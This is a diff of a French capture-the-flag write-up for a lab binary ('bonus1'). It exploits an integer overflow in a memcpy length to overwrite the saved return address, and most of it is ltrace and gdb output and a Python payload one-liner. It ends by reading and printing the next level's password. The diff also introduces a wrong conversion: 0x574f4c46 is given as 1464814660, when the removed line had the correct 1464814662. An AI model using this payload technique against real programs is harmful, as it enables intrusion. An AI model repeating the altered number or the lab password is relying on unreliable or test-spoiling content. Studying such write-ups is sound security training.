@@ -46,9 +46,37 @@ Le nombre doit être inférieur ou égal à 9.
 Puis un peu plus tard dans le programme:
    0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
    0x08048480 <+92>:	jne    0x804849e <main+122>
-Il doit être égal à 0x574f4c46 car jne => 1464814662.
+Il doit être égal à 0x574f4c46 car jne => 1464814660.
 
-Juste avant un appel à memcpy, son prototype est le suivant:
+On remarque avec ltrace que le nombre était multiplié par 4 et utilisé dans le memcpy
+
 void *memcpy(void *dest, const void *src, size_t n);
-size_t aka unsigned int aka on peut lui mettre un chiffre négatif pour qu'il soit <= 9.
+Le size_t max est de 4294967295, on le divise par 4 => 1073741823
 
+On tente un overflow sur le memcpy.
+
+http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+$> ltrace ./bonus1 -1073741823 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048424, 3, 0xbffff764, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff891, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                = 0xc0000001
+memcpy(0xbffff694, "Aa0A", 4)                                                        = 0xbffff694
++++ exited (status 0) +++
+
+On remarque que les 4 premiers char sont copiés et on tente de le faire segfault en retirant 25 au 1er argument
+25 car ce nombre sera multiplié par 4 donc 100 char que l'on ecrit
+
+(gdb) r -1073741798 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+[...]
+0x39624138 in ?? ()
+L'offset est donc 56 (0x39624138)
+
+   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
+
+On modifie l'EIP à cette adresse car elle se trouve après la seconde comparaison et avant le execl.
+
+$> ./bonus1 -1073741799 $(python -c "print 'A' * 56 + '\x82\x84\x04\x08'")
+$> ls
+ls: cannot open directory .: Permission denied
+$> cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
